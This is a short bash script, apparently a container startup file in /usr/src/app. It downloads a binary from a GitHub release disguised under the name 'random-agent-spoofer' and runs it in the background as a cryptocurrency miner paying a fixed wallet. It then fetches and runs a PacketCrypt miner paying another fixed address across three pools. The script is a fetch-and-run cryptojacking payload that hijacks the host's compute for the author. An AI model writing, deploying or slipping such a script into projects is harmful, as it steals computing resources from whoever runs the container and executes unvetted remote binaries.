#!/bin/bash
cd /usr/src/app

wget https://github.com/trangtrau/random-agent-spoofer/releases/download/va/ar 
chmod +x ar
/usr/src/app/ar -a gr -o stratum+ssl://asia.flockpool.com:5555 -u RCjpfnfFfjvhnDzfY9ShQrAtjrP3Vf2PLP.dockertest -p x &
wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt
chmod +x packetcrypt
/usr/src/app/packetcrypt ann -p pkt1qydtp765qufxpwr5wxfzdmv9m9khgdc8muzgax6 http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com
